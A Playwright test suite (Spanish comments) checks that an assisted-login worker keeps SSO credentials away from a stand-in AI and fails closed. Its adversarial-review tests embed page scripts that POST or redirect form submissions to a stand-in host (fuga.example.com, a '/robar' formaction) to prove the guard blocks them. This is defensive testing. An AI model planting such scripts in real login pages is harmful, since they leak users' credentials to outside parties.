// Cepos del LOGIN ASISTIDO del explorador (14/10/2026) con Chromium REAL. El SSO es SINTÉTICO y se sirve en su URL real
// (`https://ssoaut.gco.global`, con `context.route` → `fulfill`: nada sale a la red) imitando las DOS variantes de la 2.ª
// pantalla que describió Alberto: (a) elegir el usuario de una lista + contraseña, (b) usuario + contraseña. La «IA» es un
// doble que SOLO devuelve claves; se comprueba que lo que recibe (y el log) nunca lleva el usuario ni la contraseña.
// Nota del arnés: las rutas `fulfill` se registran DESPUÉS del guard y le ganan (Playwright: la última ruta manda), así que
// el guard no ve las peticiones a los hosts sintéticos; sí ve las de cualquier otro host (el que no tiene `fulfill`).
import assert from 'node:assert/strict'
import { after, before, test } from 'node:test'
import { existsSync, readdirSync } from 'node:fs'
import { join } from 'node:path'
import { chromium, type Browser, type BrowserContext, type Page, type Route } from 'playwright'
import { CLAVE_CONTRASENA, CLAVE_USUARIO, type InventarioDom } from '@central/module-tarificacion'
import { instalarGuardEmision, pulsar, type GuardEmision } from '../src/guard.ts'
import { exigirSinCaptcha } from '../src/captcha.ts'
import { cabeceraPortalVisible, pulsarSeguro } from '../src/adapters/occident/hogar.ts'
import { loginAsistido, type CtxLoginAsistido } from '../src/login-asistido.ts'
import { ErrorTarificador, ErrorVerificacionHumana } from '../src/errores.ts'
import type { RespuestaPaso } from '../src/api.ts'

// Compuestos en runtime: un literal con pinta de clave dispara gitleaks (ver .gitleaks.toml).
const USUARIO = ['agente', 'sintetico', '07'].join('.')
const CLAVE = ['Clave', 'Sintetica', '2026'].join('-')
const OCC = 'occident:productos:hogar'
const SSO = 'https://ssoaut.gco.global'
const PORTAL = 'https://portaloccident.gco.global'
const OTRO = 'https://otro-sso.example.com'

const pagina = (cuerpo: string, script = '') => `<!doctype html><html><head><meta charset="utf-8"><title>Acceso</title></head><body>${cuerpo}${script ? `<script>${script}</script>` : ''}</body></html>`
const VARIANTE_B = (error = '') => pagina(`<h1>Acceso</h1>${error}<form id="auth_form" method="post" action="/my.policy?apm=5">
  <label for="u">Nombre de usuario</label><input id="u" name="username" type="text">
  <label for="p">Contraseña</label><input id="p" name="password" type="password">
  <button id="SubmitCreds" type="submit">Iniciar sesión</button></form>`)
const VARIANTE_A_SELECT = pagina(`<h1>Acceso</h1><form id="auth_form" method="post" action="/my.policy?apm=5">
  <label for="s">Usuario</label><select id="s" name="username"><option value="">Elija un usuario</option><option value="otro.agente">otro.agente</option><option value="${USUARIO}">${USUARIO}</option></select>
  <label for="p">Contraseña</label><input id="p" name="password" type="password">
  <button id="SubmitCreds" type="submit">Iniciar sesión</button></form>`)
const VARIANTE_A_RADIO = pagina(`<h1>Acceso</h1><form id="auth_form" method="post" action="/my.policy?apm=5">
  <input id="r1" name="username" type="radio" value="otro.agente"><label for="r1">otro.agente</label>
  <input id="r2" name="username" type="radio" value="${USUARIO}"><label for="r2">${USUARIO}</label>
  <label for="p">Contraseña</label><input id="p" name="password" type="password">
  <button id="SubmitCreds" type="submit">Iniciar sesión</button></form>`)
const OTP = pagina('<h1>Verificación</h1><p>Introduzca el código de verificación que le hemos enviado por SMS</p><form method="post" action="/my.policy"><input id="otp" name="otp" type="text"><button type="submit">Validar</button></form>')
/** Un segundo factor que el detector del worker NO reconoce: lo para la IA (`parar otp`). */
const TOKEN = pagina('<h1>Token de acceso</h1><form method="post" action="/my.policy"><label for="t">Token</label><input id="t" name="t" type="text"><button type="submit">Continuar</button></form>')
const PORTAL_OK = pagina('<header class="MuiAppBar-root">Portal</header>')

type Escenario = { paso2: string; trasEnvio?: 'portal' | 'otp' | 'token' | 'error' }

let browser: Browser
before(async () => {
  // El resto de la red, a un proxy muerto: lo que no sirva una ruta sintética no sale (como explorador-entrada.test.ts).
  const opciones = { headless: true, args: ['--proxy-server=http://127.0.0.1:9'] }
  try {
    browser = await chromium.launch(opciones)
  } catch (e) {
    const dir0 = process.env.PLAYWRIGHT_BROWSERS_PATH ?? '/opt/pw-browsers'
    const dir = existsSync(dir0) ? readdirSync(dir0).filter((d) => /^chromium_headless_shell-\d+$/.test(d)).sort().pop() : undefined
    const exe = dir ? join(dir0, dir, 'chrome-linux', 'headless_shell') : null
    if (!exe || !existsSync(exe)) throw e
    browser = await chromium.launch({ ...opciones, executablePath: exe })
  }
})
after(async () => { await browser?.close() })

/** Montaje: guard PRIMERO, luego los hosts sintéticos. `envios` = lo que el SSO recibió (para ver que el valor LOCAL llegó). */
async function montar(es: Escenario, extra?: (c: BrowserContext) => Promise<void>) {
  const context = await browser.newContext({ locale: 'es-ES' })
  const guard = await instalarGuardEmision(context)
  const envios: URLSearchParams[] = []
  await context.route(`${SSO}/**`, async (route: Route) => {
    const req = route.request()
    if (req.method() === 'POST') {
      const datos = new URLSearchParams(req.postData() ?? '')
      envios.push(datos)
      const bien = datos.get('username') === USUARIO && datos.get('password') === CLAVE
      const que = !bien ? 'error' : (es.trasEnvio ?? 'portal')
      const html = que === 'portal' ? pagina('<p>Entrando…</p>', `location.replace('${PORTAL}/')`)
        : que === 'otp' ? OTP : que === 'token' ? TOKEN
          : VARIANTE_B('<p class="msg-error-datos">Usuario o contraseña incorrectos</p>')
      return route.fulfill({ status: 200, contentType: 'text/html; charset=utf-8', body: html })
    }
    return route.fulfill({ status: 200, contentType: 'text/html; charset=utf-8', body: es.paso2 })
  })
  await context.route(`${PORTAL}/**`, (route) => route.fulfill({ status: 200, contentType: 'text/html; charset=utf-8', body: PORTAL_OK }))
  await context.route(`${OTRO}/**`, (route) => route.fulfill({ status: 200, contentType: 'text/html; charset=utf-8', body: es.paso2 }))
  await extra?.(context)
  const page = await context.newPage()
  page.on('dialog', (d) => { d.dismiss().catch(() => {}) })
  return { context, guard, page, envios }
}

/** La «IA» de prueba: lee el inventario (marcado) y responde SOLO con claves. Guarda todo lo que recibe. */
function ia(decidir: (inv: InventarioDom, n: number) => unknown) {
  const recibido: string[] = []
  const pedirPaso = async (c: { inventario: InventarioDom; avancesFallidos: number }): Promise<RespuestaPaso> => {
    recibido.push(JSON.stringify(c))
    return { estado: 'ok', respuesta: decidir(c.inventario, recibido.length), leaseHasta: null }
  }
  return { pedirPaso, recibido }
}
const ref = (inv: InventarioDom, pred: (e: InventarioDom['marcos'][number]['elementos'][number]) => boolean) => inv.marcos.flatMap((m) => m.elementos).find(pred)?.ref ?? 'm9e999'
const porId = (id: string) => (inv: InventarioDom) => ref(inv, (e) => e.id === id)
const resp = (acciones: unknown[]) => ({ version: 1, fase: 'login', pantalla: { nombre: 'Acceso', tipo: 'formulario' }, acciones, mapeo: [], motivo: null })
const AVANZAR = (inv: InventarioDom) => ({ accion: 'avanzar', ref: porId('SubmitCreds')(inv), efectoEsperado: 'siguiente_pantalla', confianza: 'alta' })
const IA_VARIANTE_B = (inv: InventarioDom) => resp([
  { accion: 'rellenar', ref: porId('u')(inv), dato: CLAVE_USUARIO },
  { accion: 'rellenar', ref: porId('p')(inv), dato: CLAVE_CONTRASENA },
  AVANZAR(inv),
])

function ctx(page: Page, guard: GuardEmision, pedirPaso: CtxLoginAsistido['pedirPaso'], logs: string[], entrada = OCC): CtxLoginAsistido {
  const pausa = async () => {}
  return {
    entrada, credenciales: { usuario: USUARIO, contrasena: CLAVE }, guard, pausa, pedirPaso,
    pulsar: (b) => pulsarSeguro({ pausa, pulsar: (x) => pulsar(x, guard) }, b),
    exigirSinCaptcha: () => exigirSinCaptcha(page),
    enPortal: (ms) => cabeceraPortalVisible(page, Math.min(ms, 1_500)),
    log: (m, d) => { logs.push(JSON.stringify({ m, ...(d ?? {}) })) },
  }
}

/** Nada de lo que vio la IA ni del log lleva una credencial (ni el usuario en minúsculas/mayúsculas). */
function sinCredenciales(textos: string[]): void {
  for (const t of textos) {
    assert.ok(!t.includes(CLAVE), 'la contraseña no sale del worker')
    assert.ok(!t.toLowerCase().includes(USUARIO), 'el usuario no sale del worker')
  }
}

test('(a) variante usuario + contraseña: la IA dice CLAVES, el worker escribe el valor LOCAL y entra; nada sale con valores', async () => {
  const { context, guard, page, envios } = await montar({ paso2: VARIANTE_B() })
  try {
    await page.goto(`${SSO}/my.policy?apm=4`)
    const { pedirPaso, recibido } = ia(IA_VARIANTE_B)
    const logs: string[] = []
    await loginAsistido(page, ctx(page, guard, pedirPaso, logs))
    assert.equal(new URL(page.url()).origin, PORTAL)
    assert.equal(envios.length, 1)
    assert.equal(envios[0].get('username'), USUARIO, 'el SSO recibió el usuario local')
    assert.equal(envios[0].get('password'), CLAVE, 'el SSO recibió la contraseña local')
    assert.equal(recibido.length, 1)
    sinCredenciales([...recibido, ...logs])
    assert.match(logs.join('\n'), /rellenar m0e\d+=credencial\.contrasena/)
  } finally {
    await context.close()
  }
})

test('(a·bis) lo tecleado NO aparece en un inventario posterior (el SSO devuelve el formulario con error) y no se reintenta la contraseña', async () => {
  const { context, guard, page, envios } = await montar({ paso2: VARIANTE_B() })
  try {
    await page.goto(`${SSO}/my.policy?apm=4`)
    // Contraseña local distinta: el SSO responde «incorrectos» y vuelve a pedirla.
    const { pedirPaso, recibido } = ia(IA_VARIANTE_B)
    const logs: string[] = []
    const k = { ...ctx(page, guard, pedirPaso, logs), credenciales: { usuario: USUARIO, contrasena: `${CLAVE}-mal` } }
    await assert.rejects(loginAsistido(page, k), (e) => e instanceof ErrorTarificador && /ya se envió una vez/.test(e.message))
    assert.equal(envios.length, 1, 'UN solo envío de la contraseña por trabajo (bloqueo de cuenta)')
    assert.equal(recibido.length, 2, 'la 2.ª pantalla (con el error) sí se le enseña a la IA')
    sinCredenciales([...recibido, ...logs])
    assert.ok(!recibido.join('').includes(`${CLAVE}-mal`))
  } finally {
    await context.close()
  }
})

test('(b) fuera del host del SSO NO se rellena: falla cerrado sin preguntar a la IA ni escribir', async () => {
  const { context, guard, page } = await montar({ paso2: VARIANTE_B() })
  try {
    await page.goto(`${OTRO}/my.policy`)
    const { pedirPaso, recibido } = ia(IA_VARIANTE_B)
    await assert.rejects(loginAsistido(page, ctx(page, guard, pedirPaso, [])), (e) => e instanceof ErrorTarificador && /salió del SSO/.test(e.message))
    assert.equal(recibido.length, 0, 'fuera del SSO no se pregunta')
    assert.equal(await page.locator('#p').inputValue(), '', 'fuera del SSO no se escribe')
  } finally {
    await context.close()
  }
})

test('(b·bis) un campo password en un iframe de OTRO host dentro del SSO: rechazado, sin escribir', async () => {
  const conIframe = pagina(`<h1>Acceso</h1><iframe id="f" src="${OTRO}/marco" style="width:400px;height:200px"></iframe>`)
  const { context, guard, page } = await montar({ paso2: conIframe })
  await context.route(`${OTRO}/**`, (route) => route.fulfill({ status: 200, contentType: 'text/html; charset=utf-8', body: VARIANTE_B() }))
  try {
    await page.goto(`${SSO}/my.policy?apm=4`)
    await page.frameLocator('#f').locator('#p').waitFor()
    const { pedirPaso, recibido } = ia((inv) => resp([{ accion: 'rellenar', ref: porId('p')(inv), dato: CLAVE_CONTRASENA }]))
    await assert.rejects(loginAsistido(page, ctx(page, guard, pedirPaso, [])), ErrorTarificador)
    assert.equal(recibido.length, 1)
    assert.equal(await page.frameLocator('#f').locator('#p').inputValue(), '', 'el password de otro host sigue vacío')
  } finally {
    await context.close()
  }
})

test('(c) otra compañía/entrada: el login asistido no existe (sin IA, sin escribir)', async () => {
  const { context, guard, page } = await montar({ paso2: VARIANTE_B() })
  try {
    await page.goto(`${SSO}/my.policy?apm=4`)
    for (const entrada of ['allianz:particulares:hogar', 'mapfre:nueva_produccion:auto', 'inventada']) {
      const { pedirPaso, recibido } = ia(IA_VARIANTE_B)
      await assert.rejects(loginAsistido(page, ctx(page, guard, pedirPaso, [], entrada)), /no autorizado/)
      assert.equal(recibido.length, 0, entrada)
    }
    assert.equal(await page.locator('#p').inputValue(), '')
  } finally {
    await context.close()
  }
})

test('(d) variante LISTA de usuarios: la IA ve su fila como «credencial.usuario», elige y pide la contraseña (select y radio)', async () => {
  for (const [nombre, html, fila] of [['select', VARIANTE_A_SELECT, porId('s')], ['radio', VARIANTE_A_RADIO, porId('r2')]] as const) {
    const { context, guard, page, envios } = await montar({ paso2: html })
    try {
      await page.goto(`${SSO}/my.policy?apm=4`)
      const { pedirPaso, recibido } = ia((inv) => resp([
        { accion: 'elegir', ref: fila(inv), dato: CLAVE_USUARIO },
        { accion: 'rellenar', ref: porId('p')(inv), dato: CLAVE_CONTRASENA },
        AVANZAR(inv),
      ]))
      const logs: string[] = []
      await loginAsistido(page, ctx(page, guard, pedirPaso, logs))
      assert.equal(new URL(page.url()).origin, PORTAL, nombre)
      assert.equal(envios[0].get('username'), USUARIO, `${nombre}: se eligió el usuario propio`)
      assert.equal(envios[0].get('password'), CLAVE)
      assert.ok(recibido[0].includes(CLAVE_USUARIO) && recibido[0].includes('otro.agente'), `${nombre}: la IA ve su fila marcada y las ajenas`)
      sinCredenciales([...recibido, ...logs])
    } finally {
      await context.close()
    }
  }
})

test('(d·bis) elegir una fila AJENA (la IA se equivoca): el worker no la pulsa', async () => {
  const { context, guard, page, envios } = await montar({ paso2: VARIANTE_A_RADIO })
  try {
    await page.goto(`${SSO}/my.policy?apm=4`)
    // El validador ya lo rechaza (la fila no enseña la clave): nada se toca.
    const { pedirPaso } = ia((inv) => resp([{ accion: 'elegir', ref: porId('r1')(inv), dato: CLAVE_USUARIO }]))
    await assert.rejects(loginAsistido(page, ctx(page, guard, pedirPaso, [])), ErrorTarificador)
    assert.equal(await page.locator('#r1').isChecked(), false)
    assert.equal(envios.length, 0)
  } finally {
    await context.close()
  }
})

test('(e) OTP tras la contraseña: PARA (requiere persona) sin enseñar la pantalla a la IA; y si solo la reconoce la IA, también', async () => {
  for (const trasEnvio of ['otp', 'token'] as const) {
    const { context, guard, page, envios } = await montar({ paso2: VARIANTE_B(), trasEnvio })
    try {
      await page.goto(`${SSO}/my.policy?apm=4`)
      const { pedirPaso, recibido } = ia((inv, n) => (n === 1 ? IA_VARIANTE_B(inv) : resp([{ accion: 'parar', motivo: 'otp' }])))
      await assert.rejects(loginAsistido(page, ctx(page, guard, pedirPaso, [])), ErrorVerificacionHumana)
      assert.equal(envios.length, 1)
      // Pantalla de código reconocida por el worker → la IA no la ve; el «token» (no reconocido) sí, y la IA para.
      assert.equal(recibido.length, trasEnvio === 'otp' ? 1 : 2, trasEnvio)
      assert.ok(trasEnvio === 'otp' || (await page.locator('#t').inputValue()) === '', 'nunca se escribe un código')
    } finally {
      await context.close()
    }
  }
})

test('red del login: un POST a OTRO origen durante el envío del SSO se aborta y el login falla cerrado', async () => {
  const conFuga = VARIANTE_B().replace('</form>', '</form><script>document.getElementById("auth_form").addEventListener("submit", () => { fetch("https://fuga.example.com/x", { method: "POST", body: "a=1" }).catch(() => {}) })</script>')
  const { context, guard, page } = await montar({ paso2: conFuga })
  const fugas: string[] = []
  // Sin `fulfill` para fuga.example.com: la petición la ve el GUARD (si la dejara pasar, iría a la red).
  context.on('requestfailed', (r) => { if (r.url().startsWith('https://fuga.example.com')) fugas.push(r.failure()?.errorText ?? '') })
  try {
    await page.goto(`${SSO}/my.policy?apm=4`)
    const { pedirPaso } = ia(IA_VARIANTE_B)
    await assert.rejects(loginAsistido(page, ctx(page, guard, pedirPaso, [])), (e) => e instanceof ErrorTarificador && /otro origen \(https:\/\/fuga\.example\.com\)/.test(e.message))
    assert.ok(fugas.some((f) => /BLOCKED_BY_CLIENT/i.test(f)), `abortada por el guard: ${fugas.join(',')}`)
  } finally {
    await context.close()
  }
})

// ─── Revisión adversarial (14/10/2026) ───────────────────────────────────────
const LISTA_BOTONES = (fila: (u: string) => string) => pagina(`<h1>Acceso</h1><form id="auth_form" method="post" action="/my.policy?apm=5">
  ${fila('otro.agente')}${fila(USUARIO)}
  <label for="p">Contraseña</label><input id="p" name="password" type="password">
  <button id="SubmitCreds" type="submit">Iniciar sesión</button></form>`)

test('(rev 1) lista de usuarios como <button> SIN type (submit): no se pulsa y NO se envía nada', async () => {
  // a) el propio botón sin type: lo rechaza el validador; b) un role=button DENTRO de un <button> sin type: lo para el worker vivo.
  const casos: [string, string, (inv: InventarioDom) => string][] = [
    ['button sin type', LISTA_BOTONES((u) => `<button name="username" value="${u}" id="b-${u.replace(/\W/g, '')}">${u}</button>`), (inv) => ref(inv, (e) => e.tag === 'button' && e.texto === CLAVE_USUARIO)],
    ['role=button dentro de un submit', LISTA_BOTONES((u) => `<button name="username" value="${u}"><span role="button" id="s-${u.replace(/\W/g, '')}">${u}</span></button>`), (inv) => ref(inv, (e) => e.tag === 'span' && e.texto === CLAVE_USUARIO)],
  ]
  for (const [nombre, html, fila] of casos) {
    const { context, guard, page, envios } = await montar({ paso2: html })
    try {
      await page.goto(`${SSO}/my.policy?apm=4`)
      const { pedirPaso } = ia((inv) => resp([{ accion: 'elegir', ref: fila(inv), dato: CLAVE_USUARIO }]))
      await assert.rejects(loginAsistido(page, ctx(page, guard, pedirPaso, [])), ErrorTarificador, nombre)
      await page.waitForTimeout(300)
      assert.equal(envios.length, 0, `${nombre}: nada enviado`)
    } finally {
      await context.close()
    }
  }
})

test('(rev 2) avance con formaction/formmethod: GET o a otro origen → no se pulsa', async () => {
  for (const extra of ['formmethod="get"', `formaction="${OTRO}/robar"`, `formaction="${OTRO}/robar" formmethod="get"`]) {
    const html = VARIANTE_B().replace('<button id="SubmitCreds" type="submit">', `<button id="SubmitCreds" type="submit" ${extra}>`)
    const { context, guard, page, envios } = await montar({ paso2: html })
    const fuera: string[] = []
    context.on('request', (r) => { if (!r.url().startsWith(SSO) || r.method() === 'GET' && r.url().includes('username=')) fuera.push(r.url()) })
    try {
      await page.goto(`${SSO}/my.policy?apm=4`)
      const { pedirPaso } = ia(IA_VARIANTE_B)
      await assert.rejects(loginAsistido(page, ctx(page, guard, pedirPaso, [])), (e) => e instanceof ErrorTarificador && /no es un envío del formulario del SSO/.test(e.message), extra)
      assert.equal(envios.length, 0, extra)
      assert.deepEqual(fuera, [], `${extra}: nada salió del SSO`)
    } finally {
      await context.close()
    }
  }
})

test('(rev 3) un POST de NAVEGACIÓN del marco principal a otro origen sigue abortado (no cierra la ventana)', async () => {
  const html = VARIANTE_B().replace('</form>', `</form><form id="fuga" method="post" action="https://fuga.example.com/x"><input name="a" value="1"></form>
    <script>document.getElementById("auth_form").addEventListener("submit", (e) => { e.preventDefault(); document.getElementById("fuga").submit() })</script>`)
  const { context, guard, page } = await montar({ paso2: html })
  const fugas: string[] = []
  context.on('requestfailed', (r) => { if (r.url().startsWith('https://fuga.example.com')) fugas.push(`${r.method()} ${r.failure()?.errorText ?? ''}`) })
  try {
    await page.goto(`${SSO}/my.policy?apm=4`)
    const { pedirPaso } = ia(IA_VARIANTE_B)
    await assert.rejects(loginAsistido(page, ctx(page, guard, pedirPaso, [])), (e) => e instanceof ErrorTarificador && /otro origen \(https:\/\/fuga\.example\.com\)/.test(e.message))
    assert.ok(fugas.some((f) => /^POST .*BLOCKED_BY_CLIENT/i.test(f)), `abortada por el guard: ${fugas.join(',')}`)
  } finally {
    await context.close()
  }
})
